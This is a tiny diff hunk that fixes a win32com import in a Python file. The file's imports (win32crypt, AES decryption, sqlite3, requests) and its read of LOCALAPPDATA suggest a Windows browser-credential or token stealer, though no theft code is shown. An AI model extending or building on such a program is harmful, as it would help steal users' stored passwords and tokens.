@@ -1,4 +1,4 @@
-import os, re, requests, subprocess, random, time, shutil, zipfile, sys, sqlite3, json, base64, ctypes, Cryptodome.Cipher.AES, win32crypt, win32com
+import os, re, requests, subprocess, random, time, shutil, zipfile, sys, sqlite3, json, base64, ctypes, Cryptodome.Cipher.AES, win32crypt, win32com.client
 from threading import Thread
 
 local = os.getenv('LOCALAPPDATA')
